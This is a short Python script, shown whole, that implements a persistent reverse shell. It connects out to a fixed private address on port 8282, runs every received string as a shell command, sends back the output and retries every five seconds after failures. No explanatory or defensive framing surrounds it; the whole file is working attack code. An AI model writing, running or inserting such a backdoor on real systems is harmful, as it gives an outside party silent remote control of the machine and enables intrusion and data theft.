import socket, subprocess, time
h="172.17.0.3"
p=8282
while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((h, p))
        while True:
            c=s.recv(1024).decode()
            o=subprocess.run(c, shell=True, stdout=subprocess.PIPE, text=True)
            r= o.stdout
            if(r==''):
                s.send("suc".encode())
            else:
                s.send(r.encode())
    except Exception as e:
        time.sleep(5)
